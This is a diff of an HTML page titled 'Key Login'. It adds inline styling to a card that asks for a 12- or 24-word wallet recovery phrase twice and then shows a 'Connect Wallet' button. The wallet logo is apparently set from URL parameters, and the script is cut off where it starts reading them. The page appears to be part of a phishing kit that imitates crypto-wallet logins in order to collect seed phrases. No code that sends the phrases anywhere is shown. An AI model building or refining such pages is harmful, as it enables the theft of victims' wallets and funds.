@@ -1,9 +1,103 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
   <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Key Login</title>
-    <link rel="stylesheet" href="../wallets.css" />
+
+    <style>
+      /* PAGE CENTER SETUP */
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: "Montserrat", sans-serif;
+        background: linear-gradient(
+          to bottom,
+          #003125,
+          #00816c,
+          #00bd8e,
+          #003125
+        );
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: #bfffe9;
+      }
+
+      /* LOGIN CARD */
+      .card {
+        background: #003228;
+        width: 90%;
+        max-width: 380px;
+        padding: 25px;
+        border-radius: 12px;
+        text-align: center;
+        box-shadow: 0 0 20px rgba(0, 255, 200, 0.25);
+      }
+
+      /* LOGO */
+      .logo {
+        width: 90px;
+        height: 90px;
+        border-radius: 50%;
+        margin-bottom: 15px;
+      }
+
+      /* WALLET TITLE */
+      h2 {
+        margin: 10px 0 20px;
+        font-size: 24px;
+        font-weight: bold;
+        color: #bfffe9;
+      }
+
+      /* INPUT BOX */
+      .input-box {
+        width: 92%;
+        padding: 12px;
+        margin: 10px 0;
+        border-radius: 8px;
+        background: transparent;
+        border: 2px solid #00e6c3;
+        color: #bfffe9;
+        font-size: 15px;
+      }
+
+      .input-box::placeholder {
+        color: #bfffe9;
+      }
+
+      /* CHECKBOX ROW */
+      .checkbox {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin: 15px 0;
+        color: white;
+      }
+
+      /* BUTTON */
+      .btn {
+        width: 100%;
+        padding: 12px;
+        margin-top: 15px;
+        border: none;
+        border-radius: 10px;
+        background: #00e6c3;
+        color: black;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+
+      .btn:hover {
+        background: #11ffee;
+        box-shadow: 0 0 12px #11ffee;
+      }
+    </style>
   </head>
+
   <body>
     <div class="card">
       <img id="walletLogo" class="logo" src="" />
@@ -13,6 +107,7 @@
         class="input-box"
         placeholder="Enter wallet phrase (12 or 24 words)"
       ></textarea>
+
       <textarea
         class="input-box"
         placeholder="Confirm wallet phrase"
@@ -24,7 +119,6 @@
 
       <button class="btn">Connect Wallet</button>
     </div>
-    
 
     <script>
       const params = new URLSearchParams(window.location.search);
